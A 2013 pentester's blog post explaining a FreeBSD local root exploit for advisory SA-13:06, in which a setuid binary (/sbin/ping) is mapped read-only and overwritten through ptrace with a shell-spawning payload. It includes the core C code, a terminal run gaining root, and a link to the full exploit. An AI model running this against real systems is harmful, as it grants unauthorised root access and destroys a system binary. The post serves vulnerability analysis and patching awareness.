---
layout: post
title: I feel lucky - or why I wrote a FreeBSD 1-day in one day
author: hugsy
tags:
- freebsd
- pentest
date: 2013-06-20 00:00 +0000
---

Sometimes life gives you eggs for free, you just need to spend some time making an omelet. That's exactly what happened to me on a recent engagement for a client: a typical PHP webapp full of holes left me with a nice stable shell access.

But at that point I was stuck: I had a limited account (`www`) on this FreeBSD 9.1 (almost) up-to-date box, and interestingly  the privilege separation was done correctly enough to prevent me from getting `root` access simply by abusing the usual suspects (weak FS permission, setuid bins, privileged scripts and the likes).

So it was with little hope I decided to take a look at the [recent advisories for FreeBSD](https://www.freebsd.org/security/advisories/) which I really like because they are well maintained. One title struck my eye immediately: [SA-13:06.mmap - Privilege escalation via `mmap`](https://www.freebsd.org/security/advisories/FreeBSD-SA-13:06.mmap.asc), published the day right before!

I decided to look into it at first with not much hope, thinking the exploit would be crazy hard to trigger and heavily deep inside FreeBSD kernel. The description was actually (on purpose?) quite generic

> Due to insufficient permission checks in the virtual memory system, a tracing process (such as a debugger) may be able to modify portions of the traced process's address space to which the traced process itself does not have write access.

But the [patch](http://security.FreeBSD.org/patches/SA-13:06/mmap.patch) gave me a better idea of the issue:

```patch
Index: sys/vm/vm_map.c
===================================================================
--- sys/vm/vm_map.c	(revision 251636)
+++ sys/vm/vm_map.c	(working copy)
@@ -3761,6 +3761,12 @@ RetryLookup:;
 		vm_map_unlock_read(map);
 		return (KERN_PROTECTION_FAILURE);
 	}
+	if ((fault_typea & VM_PROT_COPY) != 0 &&
+	    (entry->max_protection & VM_PROT_WRITE) == 0 &&
+	    (entry->eflags & MAP_ENTRY_COW) == 0) {
+		vm_map_unlock_read(map);
+		return (KERN_PROTECTION_FAILURE);
+	}

 	/*
 	 * If this page is not pageable, we have to get it for all possible
```

It kindda gave a good pointer of where to start: the usual rule for setuid dictates that a write access should immediately imply losing the elevated privilege. But this is where the bug was: by `mmap` a setuid binary (which any user can do), I can then choose to `ptrace` the process, and use `PT_WRITE` command to overwrite the `mmap`-ed memory, effectively overwriting the setuid binary!

_Note_: I was in a rush, so my exploit is partially destructive as I overwrite directly the setuid binary. If you choose to use it, please make a copy to be able to restore it.

My exploit was in 4 parts:

1. `mmap` the target binary (here I chose `/sbin/ping`)
```c
int fd = open("/sbin/ping", O_RDONLY);
caddr_t addr = mmap(NULL, LEN, PROT_READ, MAP_SHARED, fd, 0);
```

2. `fork` to passe to be the mmaped address to a process I can attach to using `ptrace()`

3. in the parent process, I attach to the child process and then prepare a basic payload to substitute the original code with

```c
	if (ptrace(PT_ATTACH, pid, 0, 0) < 0) {
		perror("[-] ptrace(PT_ATTACH) failed");
		return;
	}
   [...]
   int fd = open("./sc.c", O_WRONLY|O_CREAT,  S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH);
	write(fd,
         "#include <stdio.h>\n"\
         "main(){ "\
         "char* s[]={\"/bin/sh\",NULL};"\
         "setuid(0);execve(s[0],s,0); }\n",
         84);
	close(fd);
	system("gcc -o ./sc ./sc.c");
```

4. all done, we could now copy our payload 1 DWORD at a time using `ptrace(PT_WRITE_D)`
```c
   fd = open("./sc", O_RDONLY);
	while (1) {
		int a;
		int n = read(fd, &a, sizeof(int));
		if (n <= 0) break;
		ptrace(PT_WRITE_D, pid, mmap_setuid_address+i, a);
		i+=n;
	}
```

Done! Simply execute the target binary to get a root shell.

```bash
 $ id
 uid=1001(user) gid=1001(user) groups=1001(user)
 $ gcc -Wall ./mmap.c && ./a.out
 [+] Saved old '/sbin/ping'
 [+] Using mmap-ed area at 0x281a4000
 [+] Attached to 3404
 [+] Copied 4917 bytes of payload to '/sbin/ping'
 [+] Triggering payload
 # id
 uid=0(root) gid=0(wheel) egid=1001(user) groups=1001(user),0(wheel)
```

By nature, this exploit is very stable and I was able to report that I had `root` access to my customer :)
I was undeniably lucky to find exactly the privesc I need just exactly when I needed it (kudos to Konstantin Belousov & Alan Cox for the finding), but it also taught me that there can be a huge difference of postponing applying patches, even if for one day...

Cheers mates!

PS: for the full [quick'n dirty exploit](https://gist.github.com/hugsy/5933831)